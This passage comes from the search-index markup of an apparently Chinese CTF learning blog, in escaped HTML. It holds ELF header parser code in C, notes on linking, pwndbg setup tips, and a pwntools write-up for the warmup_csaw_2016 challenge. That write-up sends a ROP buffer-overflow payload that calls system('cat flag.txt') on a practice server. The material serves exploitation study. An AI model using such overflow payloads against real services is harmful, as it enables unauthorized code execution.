    printf(&amp;quot;Section header table entry size: %d(bytes)\n&amp;quot;,e64_hd.e_shentsize);
    printf(&amp;quot;Section header table entry count: %d\n&amp;quot;,e64_hd.e_shnum);
    printf(&amp;quot;Section header string table index: %d\n\n&amp;quot;,e64_hd.e_shstrndx);
    scnum=e64_hd.e_shnum;
    sy=e64_hd.e_shstrndx;
    // section start
    printf(&amp;quot;section:\n&amp;quot;);
    // Elf64_Shdr *sc;//ÂèÇËßÅelf.hÂÆö‰πâ
    Elf64_Shdr sc[scnum];
    fseek(pt, e64_hd.e_shoff, SEEK_SET);//‰ªéÊñá‰ª∂ÂºÄÂ§¥ÂºÄÂßãÂÅèÁßªe64_hd.e_shoff
    fread(sc,sizeof(Elf64_Shdr)*scnum,1,pt);//‰ªéÊñá‰ª∂ÊµÅËØªÂèñÊï∞ÊçÆÂà∞sc‰∏≠
    printf(&amp;quot;  \ttype      addr      offset    size\n&amp;quot;);
    for(int i=0;i&amp;lt;scnum;i++)
    {
        printf(&amp;quot;num:%d\t%-10x%-10x%-10x%-10d\n&amp;quot;,i+1,sc[i].sh_type,sc[i].sh_addr,sc[i].sh_offset,sc[i].sh_size);
    }
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;warmup_csaw_2016_1:&lt;br&gt;
Ê≠§È¢ò64‰Ωç‰øùÊä§ÂÖ®ÂÖ≥Ôºåf12ÂèëÁé∞Êúâ&lt;code&gt;systemÂíåcat flag.txt&lt;/code&gt;ÂèØ‰ª•Ê†πÊçÆÊèêÁ§∫Áõ¥Êé•Ê∫¢Âá∫Âà∞ÂêéÈó®Âú∞ÂùÄÔºå‰πüÂèØ‰ª•‰º†ÂèÇ‰ΩúÁ≠î&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1673972525899.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
# context(log_level=&#39;debug&#39;,os=&#39;linux&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])


io=remote(&amp;quot;node4.buuoj.cn&amp;quot;,28711)
elf=ELF(&amp;quot;./222&amp;quot;)
sys_addr=elf.sym[b&amp;quot;system&amp;quot;]
# sys_addr=0x400378
# ret_addr=0x4004a1
str_flag_addr=next(elf.search(b&amp;quot;cat flag.txt&amp;quot;))
# str_flag_addr=0x400734
pop_rdi_addr=0x400713
payload=cyclic(0x48)+p64(pop_rdi_addr)+p64(str_flag_addr)+p64(sys_addr)
io.sendline(payload)
io.interactive()

# Gadgets information
# ============================================================
# 0x000000000040070c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040070e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400710 : pop r14 ; pop r15 ; ret
# 0x0000000000400712 : pop r15 ; ret
# 0x000000000040070b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040070f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x0000000000400565 : pop rbp ; ret
# 0x0000000000400713 : pop rdi ; ret
# 0x0000000000400711 : pop rsi ; pop r15 ; ret
# 0x000000000040070d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004004a1 : ret
# 0x0000000000400595 : ret 0xc148

# Unique gadgets found: 12
&lt;/code&gt;&lt;/pre&gt;
">week3‰Ωú‰∏ö</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/4zZZpFGKf/"" data-c="
          &lt;ul&gt;
&lt;li&gt;‰∏ÄÂºÄÂßãÁöÑcontextÊ®°ÊùøÂ¶Ç‰∏ã&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;
context.log_level = &#39;debug&#39;
context.arch=&#39;amd64&#39;
context.os=&#39;linux&#39; #Ââç‰∏âÈ°πÂèØÊ†πÊçÆÂÆûÈôÖÊÉÖÂÜµÊõ¥Êîπ
context.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;] #ÈúÄË¶ÅÈÖçÂêàtmux‰ΩøÁî®ÔºåÂºÄÂêØgdbË∞ÉËØïÂâçÈúÄÊâìÂºÄtmux

&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;‰ΩøÁî®tmuxÂø´Êç∑ÈîÆÂî§Ëµ∑ÊñπÂºè‰∏∫ &lt;code&gt;ctrl+b&lt;/code&gt; ÔºåÂêéÊé•ÂÖ∂ÂÆÉÈîÆÔºåÂ¶Ç&lt;code&gt;ctrl+b o&lt;/code&gt; ÂèØ‰ª•ÂàáÊç¢ÂàÜÂ±èÁöÑ&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1673200645360.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/li&gt;
&lt;/ul&gt;
">pwndbgË∞ÉËØïÊ≥®ÊÑè‰∫ãÈ°π</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/diY6jAN2C/"" data-c="
          &lt;ul&gt;
&lt;li&gt;ELFÊñá‰ª∂Áõ∏ÂÖ≥&lt;a href=&#34;https://oraclepi.tech/k_3A9NnKQ&#34;&gt;PWNÁØá-‰∫åËøõÂà∂Êñá‰ª∂&lt;/a&gt;&lt;br&gt;
ELF headerËß£ÊûêÂô®&lt;br&gt;
Êü•Áúã&lt;code&gt;elf.h&lt;/code&gt;‰∏≠ÊúâÂÆö‰πâ&lt;br&gt;
ÂàôÂèØ‰ª•‰ªéÊñá‰ª∂ÊµÅ‰∏≠ËØªÂÖ•Êï∞ÊçÆÂà∞ÊåáÈíà‰∏≠ÔºåËøõËÄåËæìÂá∫ELF Header‰ø°ÊÅØ&lt;br&gt;
‰ª•‰∏ã‰ª£Á†ÅÂú®Windows‰∏≠ÁºñËØëÈúÄË¶ÅÂ∞Ü&lt;code&gt;elf.h&lt;/code&gt;Êñá‰ª∂Â§çÂà∂Âà∞&lt;code&gt;/include&lt;/code&gt;ÁõÆÂΩï‰∏ã&lt;br&gt;
32‰Ωç‰∏é64‰ΩçÂú®Êñá‰ª∂Â§¥ÊúâÂå∫Âà´Ôºö&lt;img src=&#34;https://oraclepi.tech/post-images/1672930092109.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
64‰ΩçÁâàÊú¨:&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include&amp;lt;bits/stdc++.h&amp;gt;
#include&amp;lt;elf.h&amp;gt;
using namespace std;
signed main()
{
    Elf64_Ehdr e64_hd;//ÂèÇËßÅelf.hÂÆö‰πâ
    FILE *pt;//ÂÆö‰πâFILEÁ±ªÂûãÁöÑÊåáÈíà
    pt=freopen(&amp;quot;question_5_x64&amp;quot;,&amp;quot;r&amp;quot;,stdin);//ÈúÄË¶ÅÂà§Êñ≠ÁöÑÊñá‰ª∂
    fread(&amp;amp;e64_hd,sizeof(Elf64_Ehdr),1,pt);//‰ªéÊñá‰ª∂ÊµÅËØªÂèñÊï∞ÊçÆÂà∞e64_hd‰∏≠
    printf(&amp;quot;Magic number and other info: &amp;quot;);
    for(int i=0;i&amp;lt;16;i++)
    {
        printf(&amp;quot;%02x &amp;quot;,e64_hd.e_ident[i]);
        // cout&amp;lt;&amp;lt;e64_hd.e_ident[i];
    }
    printf(&amp;quot;\n&amp;quot;);
    printf(&amp;quot;Object file type: %x\n&amp;quot;,e64_hd.e_type);
    // cout&amp;lt;&amp;lt;&amp;quot;Object file type: &amp;quot;&amp;lt;&amp;lt;e64_hd.e_type&amp;lt;&amp;lt;endl;
    printf(&amp;quot;Architecture: %lu\n&amp;quot;,e64_hd.e_machine);
    // cout&amp;lt;&amp;lt;&amp;quot;Architecture: &amp;quot;&amp;lt;&amp;lt;e64_hd.e_machine&amp;lt;&amp;lt;endl;
    printf(&amp;quot;Entry point virtual address: 0x%x\n&amp;quot;,e64_hd.e_entry);
    printf(&amp;quot;Program header table file offset: %d(bytes into file)\n&amp;quot;,e64_hd.e_phoff);
    printf(&amp;quot;Section header table file offset: %d(bytes into file)\n&amp;quot;,e64_hd.e_shoff);
    printf(&amp;quot;Processor-specific flags: 0x%x\n&amp;quot;,e64_hd.e_flags);
    printf(&amp;quot;ELF header size in bytes: %d(bytes)\n&amp;quot;,e64_hd.e_ehsize);
    printf(&amp;quot;Program header table entry size: %d(bytes)\n&amp;quot;,e64_hd.e_phentsize);
    printf(&amp;quot;Program header table entry count: %d\n&amp;quot;,e64_hd.e_phnum);
    printf(&amp;quot;Section header table entry size: %d(bytes)\n&amp;quot;,e64_hd.e_shentsize);
    printf(&amp;quot;Section header table entry count: %d\n&amp;quot;,e64_hd.e_shnum);
    printf(&amp;quot;Section header string table index: %d\n&amp;quot;,e64_hd.e_shstrndx);
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Êà™Âõæ‰∏é&lt;code&gt;readelf -h&lt;/code&gt;ÂØπÊØîÔºö&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1672929898271.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;/br&gt;&lt;/br&gt;&lt;br&gt;
32‰ΩçÁâàÊú¨Ôºö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include&amp;lt;bits/stdc++.h&amp;gt;
#include&amp;lt;elf.h&amp;gt;
using namespace std;
signed main()
{
    Elf32_Ehdr e32_hd;//ÂèÇËßÅelf.hÂÆö‰πâ
    FILE *pt;//ÂÆö‰πâFILEÁ±ªÂûãÁöÑÊåáÈíà
    pt=freopen(&amp;quot;question_5_x86&amp;quot;,&amp;quot;r&amp;quot;,stdin);//ÈúÄË¶ÅÂà§Êñ≠ÁöÑÊñá‰ª∂
    fread(&amp;amp;e32_hd,sizeof(Elf32_Ehdr),1,pt);//‰ªéÊñá‰ª∂ÊµÅËØªÂèñÊï∞ÊçÆÂà∞e32_hd‰∏≠
    printf(&amp;quot;Magic number and other info: &amp;quot;);
    for(int i=0;i&amp;lt;16;i++)
    {
        printf(&amp;quot;%02x &amp;quot;,e32_hd.e_ident[i]);
        // cout&amp;lt;&amp;lt;e32_hd.e_ident[i];
    }
    printf(&amp;quot;\n&amp;quot;);
    printf(&amp;quot;Object file type: %x\n&amp;quot;,e32_hd.e_type);
    // cout&amp;lt;&amp;lt;&amp;quot;Object file type: &amp;quot;&amp;lt;&amp;lt;e32_hd.e_type&amp;lt;&amp;lt;endl;
    printf(&amp;quot;Architecture: %lu\n&amp;quot;,e32_hd.e_machine);
    // cout&amp;lt;&amp;lt;&amp;quot;Architecture: &amp;quot;&amp;lt;&amp;lt;e32_hd.e_machine&amp;lt;&amp;lt;endl;
    printf(&amp;quot;Entry point virtual address: 0x%x\n&amp;quot;,e32_hd.e_entry);
    printf(&amp;quot;Program header table file offset: %d(bytes into file)\n&amp;quot;,e32_hd.e_phoff);
    printf(&amp;quot;Section header table file offset: %d(bytes into file)\n&amp;quot;,e32_hd.e_shoff);
    printf(&amp;quot;Processor-specific flags: 0x%x\n&amp;quot;,e32_hd.e_flags);
    printf(&amp;quot;ELF header size in bytes: %d(bytes)\n&amp;quot;,e32_hd.e_ehsize);
    printf(&amp;quot;Program header table entry size: %d(bytes)\n&amp;quot;,e32_hd.e_phentsize);
    printf(&amp;quot;Program header table entry count: %d\n&amp;quot;,e32_hd.e_phnum);
    printf(&amp;quot;Section header table entry size: %d(bytes)\n&amp;quot;,e32_hd.e_shentsize);
    printf(&amp;quot;Section header table entry count: %d\n&amp;quot;,e32_hd.e_shnum);
    printf(&amp;quot;Section header string table index: %d\n&amp;quot;,e32_hd.e_shstrndx);
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Êà™Âõæ‰∏é&lt;code&gt;readelf -h&lt;/code&gt;ÂØπÊØîÔºö&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1672930001146.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;/br&gt;&lt;/br&gt;&lt;/p&gt;
">PWN phase1</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/RVZOEWv6Q/"" data-c="
          &lt;ul&gt;
&lt;li&gt;
&lt;p&gt;spÂíåbpÂØªÂùÄÊúâÂå∫Âà´&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Âπ≥Ë°°Ê†àÈóÆÈ¢ò&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1671956912081.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
Â¶Ç&lt;a href=&#34;C:%5CUsers%5COrrr%5CDesktop%5CCTF%5Cpwn%5Cpc%5Cun%5Cret2libc&#34;&gt;ret2libc&lt;/a&gt;Âèä&lt;a href=&#34;C:%5CUsers%5COrrr%5CDesktop%5CCTF%5Cpwn%5Cpc%5Cun%5Cret2libc&#34;&gt;exp&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#coding:utf8
from pwn import *

context.log_level = &#39;debug&#39;
context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;] #pwndbgÈÄÇÈÖçËØ•ÁªàÁ´ØÔºåÂä†‰∏äËøôÂè•ËØùÔºåÊàë‰ª¨Â∞±ÂèØ‰ª•Âú®‰∏Ä‰∏™ÁªàÁ´ØËøõË°åÂàÜÂ±èË∞ÉËØïÔºåÂàÜÂ±èÁöÑÂàáÊç¢‰∏ÄÁ±ªÁöÑÊìç‰ΩúËøòÈúÄË¶ÅÊü•Áúã‰∏Ä‰∏ãtmuxÂ¶Ç‰Ωï‰ΩøÁî®

ip = &#39;&#39;
port = 0
process_name = &#39;&#39;
if args.G:           #ËøòÊ≤°ÊêûÊ∏ÖÊ•öÊòØ‰ªÄ‰πàÂéüÁêÜÔºå‰ΩÜÊòØÁî®Ê≥ïÂ∞±ÊòØÂú®ÂèÇÊï∞ÂàóË°®‰∏≠Âä†‰∏™GÂ∞±ÂèØ‰ª•ËøõÂÖ•Êú¨Âú∞Ë∞ÉËØïÁöÑÂàÜÊîØ
    sh = process(process_name)
    addr=&#39;&#39;
    gdb.attach(sh, &amp;quot;b *&amp;quot; + addr)  
else:
    sh = remote(ip,port)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ÂÖ≥‰∫é`close&#39;&lt;img src=&#34;https://oraclepi.tech/post-images/1672932863356.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;expËÑöÊú¨ÈáåÈù¢ÂÜôpayloadÈ°∫Â∫è‰∏çËÉΩÈîô&lt;/li&gt;
&lt;li&gt;systemÂíåcall _system‰ª•Âèä16Â≠óËäÇÂØπÈΩê&lt;a href=&#34;https://www.cnblogs.com/kingbridge/articles/15839185.html&#34;&gt;link&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;patchelf --set-interpreter  &lt;code&gt;ld* file&lt;/code&gt; ./pwn&lt;/li&gt;
&lt;li&gt;patchelf --replace-needed &lt;code&gt;old libc* file    new libc* file &lt;/code&gt; ./pwn&lt;/li&gt;
&lt;li&gt;set debug-file-directory  ./.debug/&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;recvÊ≥®ÊÑè‰∫ãÈ°πÔºö&lt;br&gt;
&lt;a href=&#34;https://blog.csdn.net/hanqdi_/article/details/107164199?spm=1001.2101.3001.6650.1&amp;amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1-107164199-blog-122901902.pc_relevant_multi_platform_whitelistv3&amp;amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1-107164199-blog-122901902.pc_relevant_multi_platform_whitelistv3&amp;amp;utm_relevant_index=2&#34;&gt;link&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Ê†àËøÅÁßªÔºö&lt;a href=&#34;https://blog.csdn.net/mcmuyanga/article/details/109728490&#34;&gt;link&lt;/a&gt;&lt;br&gt;
&lt;a href=&#34;https://www.freebuf.com/articles/network/340303.html&#34;&gt;link&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;pwndbgÊâìÊñ≠ÁÇπ ÂºÄÂêØpieÁöÑ‰ΩøÁî® gdb &lt;em&gt;$rebase(0x&lt;/em&gt;)&lt;/p&gt;
&lt;p&gt;signinÁªïËøátail ./*&lt;/p&gt;
&lt;p&gt;mp_.tcache_binsÊÄé‰πàÊâæÔºåÂìàÂìàÔºåsearch -8 Â†ÜÂü∫ÂùÄÔºå&lt;br&gt;
ÊâæÂà∞Âú®libc.so‰∏äÁöÑÂú∞ÂùÄÔºåËØ•Âú∞ÂùÄÂä†8Â∞±ÊòØmp_.tcache_binsÁöÑÂú∞ÂùÄ&lt;/p&gt;
">PWNÁõ∏ÂÖ≥</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/k_3A9NnKQ/"" data-c="
          &lt;h2&gt;ELFÊñá‰ª∂(Linux‰∏äËøêË°å,Ë¢´ÁªüÁß∞‰∏∫object file)&lt;/h2&gt;
&lt;h3&gt;Êñá‰ª∂Á±ªÂûã:&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;ÂèØÊâßË°åÊñá‰ª∂(.exec)&lt;/code&gt;:LinkerÂØπ.oÊñá‰ª∂ËøõË°åÂ§ÑÁêÜËæìÂá∫ÁöÑÊñá‰ª∂ÔºåËøõÁ®ãÊò†ÂÉè&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ÂèØÈáçÂÆö‰ΩçÊñá‰ª∂(.rel)&lt;/code&gt;:ÁºñËØëÂô®ÂíåÊ±áÁºñÂô®‰∫ßÁîüÁöÑ.oÊñá‰ª∂ÔºåË¢´LinkerÊâÄÂ§ÑÁêÜ&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ÂÖ±‰∫´ÁõÆÊ†áÊñá‰ª∂(.dyn)&lt;/code&gt;:Âä®ÊÄÅÂ∫ìÊñá‰ª∂.so&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Êñá‰ª∂ÁªÑÊàê:&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;ELFÊñá‰ª∂Â§¥&lt;/strong&gt;:&lt;br&gt;
ÂåÖÂê´Êñá‰ª∂Âü∫Êú¨‰ø°ÊÅØÔºåÊñá‰ª∂Â§¥ÈÉ®Â≠òÂú®&lt;code&gt;È≠îÊúØÂ≠óÁ¨¶(7f 45 4c 46)&lt;/code&gt;,Âç≥Â≠óÁ¨¶‰∏≤&lt;code&gt;\177ELF&lt;/code&gt;ÔºåÂΩìÊñá‰ª∂Ë¢´Êò†Â∞ÑÂà∞ÂÜÖÂ≠òÊó∂ÔºåÂèØ‰ª•ÈÄöËøáÊêúÁ¥¢ËØ•Â≠óÁ¨¶Á°ÆÂÆöÊò†Â∞ÑÂú∞ÂùÄÔºådumpÂÜÖÂ≠òÊó∂ÊúâÁî®&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34;&gt;#define EI_NIDENT 16
typedef struct{
    /*ELFÁöÑ‰∏Ä‰∫õÊ†áËØÜ‰ø°ÊÅØÔºåÂõ∫ÂÆöÂÄº*/
    unsigned char e_ident[EI_NIDENT];
    /*ÁõÆÊ†áÊñá‰ª∂Á±ªÂûãÔºö1-ÂèØÈáçÂÆö‰ΩçÊñá‰ª∂Ôºå2-ÂèØÊâßË°åÊñá‰ª∂Ôºå3-ÂÖ±‰∫´ÁõÆÊ†áÊñá‰ª∂Á≠â*/
    Elf32_Half e_type;
    /*Êñá‰ª∂ÁöÑÁõÆÊ†á‰ΩìÁ≥ªÁªìÊûÑÁ±ªÂûãÔºö3-intel 80386*/
    Elf32_Half e_machine;
    /*ÁõÆÊ†áÊñá‰ª∂ÁâàÊú¨Ôºö1-ÂΩìÂâçÁâàÊú¨*/
    Elf32_Word e_version;
    /*Á®ãÂ∫èÂÖ•Âè£ÁöÑËôöÊãüÂú∞ÂùÄÔºåÂ¶ÇÊûúÊ≤°ÊúâÂÖ•Âè£ÔºåÂèØ‰∏∫0*/
    Elf32_Addr e_entry;
    /*Á®ãÂ∫èÂ§¥Ë°®(segment header table)ÁöÑÂÅèÁßªÈáèÔºåÂ¶ÇÊûúÊ≤°ÊúâÔºåÂèØ‰∏∫0*/
    Elf32_Off e_phoff;
    /*ËäÇÂå∫Â§¥Ë°®(section header table)ÁöÑÂÅèÁßªÈáèÔºåÊ≤°ÊúâÂèØ‰∏∫0*/
    Elf32_Off e_shoff;
    /*‰∏éÊñá‰ª∂Áõ∏ÂÖ≥ÁöÑÔºåÁâπÂÆö‰∫éÂ§ÑÁêÜÂô®ÁöÑÊ†áÂøó*/
    Elf32_Word e_flags;
    /*ELFÂ§¥ÈÉ®ÁöÑÂ§ßÂ∞èÔºåÂçï‰ΩçÂ≠óËäÇ*/
    Elf32_Half e_ehsize;
    /*Á®ãÂ∫èÂ§¥Ë°®ÊØè‰∏™Ë°®È°πÁöÑÂ§ßÂ∞èÔºåÂçï‰ΩçÂ≠óËäÇ*/
    Elf32_Half e_phentsize;
    /*Á®ãÂ∫èÂ§¥Ë°®Ë°®È°πÁöÑ‰∏™Êï∞*/
    Elf32_Half e_phnum;
    /*ËäÇÂå∫Â§¥Ë°®ÊØè‰∏™Ë°®È°πÁöÑÂ§ßÂ∞èÔºåÂçï‰ΩçÂ≠óËäÇ*/
    Elf32_Half e_shentsize;
    /*ËäÇÂå∫Â§¥Ë°®Ë°®È°πÁöÑÊï∞ÁõÆ*/
    Elf32_Half e_shnum;
    /*Êüê‰∫õËäÇÂå∫‰∏≠ÂåÖÂê´Âõ∫ÂÆöÂ§ßÂ∞èÁöÑÈ°πÁõÆÔºåÂ¶ÇÁ¨¶Âè∑Ë°®„ÄÇÂØπ‰∫éËøôÁ±ªËäÇÂå∫ÔºåÊ≠§ÊàêÂëòÁªôÂá∫ÊØè‰∏™Ë°®È°πÁöÑÈïøÂ∫¶Â≠óËäÇÊï∞„ÄÇ*/
    Elf32_Half e_shstrndx;
}Elf32_Ehdr;
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;ËäÇÂ§¥Ë°®(ÂèØÂéª‰ª•Â¢ûÂä†ÂèçÁºñËØëÂô®ÂàÜÊûêÈöæÂ∫¶)&lt;/strong&gt;Ôºö&lt;br&gt;
ÁõÆÊ†áÊñá‰ª∂ÁöÑËäÇ‰ø°ÊÅØ‰øùÂ≠òÂú®ËäÇÂ§¥Ë°®ÔºåË°®ÁöÑÊØè‰∏ÄÈ°πÈÉΩÊòØ‰∏Ä‰∏™ÁªìÊûÑ‰ΩìÔºåËÆ∞ÂΩïËäÇÁöÑÂêçÂ≠ó„ÄÅÈïøÂ∫¶„ÄÅÂÅèÁßª„ÄÅËØªÂÜôÊùÉÈôêÁ≠â‰ø°ÊÅØ&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;ÂèØÊâßË°åÊñá‰ª∂ÁöÑË£ÖËΩΩ:&lt;/h3&gt;
&lt;p&gt;ËØ¶ËßÅ&lt;a href=&#34;https://zhuanlan.zhihu.com/p/127821301&#34;&gt;Áü•‰πé‰∏ìÊ†è&lt;/a&gt;&lt;br&gt;
&lt;/br&gt;&lt;/br&gt;&lt;/p&gt;
&lt;h2&gt;ÈùôÊÄÅÈìæÊé•&lt;/h2&gt;
&lt;h3&gt;Âú∞ÂùÄÁ©∫Èó¥ÂàÜÈÖç(Â∞ÜÁõÆÊ†áÈìæÊé•‰∏∫ÂèØÊâßË°åÊñá‰ª∂Êó∂)&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;ÊåâÂ∫èÂè†Âä†&lt;br&gt;
ÂΩìÁõÆÊ†áÊñá‰ª∂ËøáÂ§öÊó∂ÔºåËæìÂá∫ÁöÑÂèØÊâßË°åÊñá‰ª∂ÈùûÂ∏∏Èõ∂Êï£Ôºå‰∏îÊÆµÁöÑË£ÖËΩΩÂú∞ÂùÄÂíåÁ©∫Èó¥‰ª•È°µ‰∏∫Âçï‰ΩçÂØπÈΩêÈÄ†ÊàêÂÜÖÂ≠òÊµ™Ë¥π&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1665370739153.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Áõ∏‰ººËäÇÂêàÂπ∂&lt;br&gt;
Â∞Ü‰∏çÂêåÁõÆÊ†áÊñá‰ª∂ÁöÑÁõ∏ÂêåÂ±ûÊÄßÁöÑËäÇÂêàÂπ∂‰∏∫‰∏Ä‰∏™ËäÇ&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1665370746247.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;ÈùôÊÄÅÈìæÊé•ËøáÁ®ã&lt;/h3&gt;
&lt;p&gt;Á¨¶Âè∑Ëß£Êûê(Á¨¶Âè∑ÁöÑÂºïÁî®‰∏éÂÖ∂ÂÆö‰πâÁõ∏ÂÖ≥ËÅî)&lt;br&gt;
ÈáçÂÆö‰Ωç(Â∞ÜÁ¨¶Âè∑ÁöÑÂÆö‰πâ‰∏éÂÜÖÂ≠òÂú∞ÂùÄÁõ∏ÂÖ≥ËÅîÔºåÁÑ∂Âêé‰øÆÊîπÂÖ∂ÂºïÁî®Ôºå‰ΩøÂÖ∂ÊåáÂêëËøô‰∫õÂÜÖÂ≠òÂú∞ÂùÄ)&lt;/p&gt;
&lt;h3&gt;ÈùôÊÄÅÈìæÊé•Â∫ì&lt;/h3&gt;
&lt;p&gt;&lt;s&gt;Á±ª‰ººCPPÂ§¥Êñá‰ª∂&lt;/s&gt;&lt;br&gt;
&lt;/br&gt;&lt;/br&gt;&lt;/p&gt;
&lt;h2&gt;Âä®ÊÄÅÈìæÊé•&lt;/h2&gt;
&lt;p&gt;Âú®ËøêË°åÊàñË£ÖËΩΩÊó∂ÔºåÂú®ÂÜÖÂ≠ò‰∏≠ÂÆåÊàêÈìæÊé•ÁöÑËøáÁ®ã&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1665371493342.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h3&gt;‰ΩçÁΩÆÊó†ÂÖ≥‰ª£Á†Å&lt;/h3&gt;
&lt;p&gt;Âú∞ÂùÄÊó†ÂÖ≥‰ª£Á†Å(Ëã±Êñá: position-independent codeÔºåÁº©ÂÜô‰∏∫&lt;code&gt;PIC&lt;/code&gt;)ÔºåÂèàÁß∞Âú∞ÂùÄÊó†ÂÖ≥ÂèØÊâßË°åÊñá‰ª∂(Ëã±Êñá:&lt;br&gt;
position-independent executableÔºåÁº©ÂÜô‰∏∫&lt;code&gt;PIE&lt;/code&gt;) ÔºåÊòØÊåáÂèØÂú®‰∏ªÂ≠òÂÇ®Âô®‰∏≠‰ªªÊÑè‰ΩçÁΩÆÊ≠£Á°ÆÂú∞ËøêË°åÔºå&lt;br&gt;
ËÄå‰∏çÂèóÂÖ∂ÁªùÂØπÂú∞ÂùÄÂΩ±ÂìçÁöÑ‰∏ÄÁßçÊú∫Âô®Á†Å&lt;/p&gt;
&lt;h3&gt;Âª∂ËøüÁªëÂÆö&lt;h3&gt;
&lt;p&gt;Âª∂ËøüÁªëÂÆö(Lazy Binding)ÊòØÂä®ÊÄÅÈìæÊé•Âô®Áî®Êù•ÂáèÂ∞ëÁ®ãÂ∫èÂêØÂä®Êó∂Èó¥ÁöÑ‰∏ÄÁßçÊäÄÊúØ„ÄÇ Âª∂ËøüÁªëÂÆöÂ∞±ÊòØÂú®ÂáΩÊï∞Á¨¨‰∏ÄÊ¨°Ë¢´Ë∞ÉÁî®ÁöÑÊó∂ÂÄôÂÜçÂíåÂáΩÊï∞Âú∞ÂùÄÁªëÂÆö„ÄÇ&lt;/p&gt;
">PWNÁØá-‰∫åËøõÂà∂Êñá‰ª∂</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/about/"" data-c="
          &lt;p&gt;Âï•‰πü‰∏ç‰ºö&lt;br&gt;
member of ChaMd5&lt;/p&gt;
&lt;p&gt;cXElM0E5MTg1Njk2MTM=&lt;/p&gt;
">ABout</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/xian-duan-shu-wei-hu-qu-jian-zui-zhi-wen-ti/"" data-c="
          &lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;È¢òÈù¢&lt;/strong&gt;&lt;br&gt;
ÁªôÂÆöÁªôÂÆöÂê´n‰∏™Êï∞ÁöÑÊï∞ÁªÑA[N],Ê±ÇÂå∫Èó¥[L,R]ÁöÑÂíå&lt;br&gt;
Êï∞ÁªÑ‰∏™Êï∞‰∏∫n,qÊ¨°Êü•ËØ¢Âå∫Èó¥l,r;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
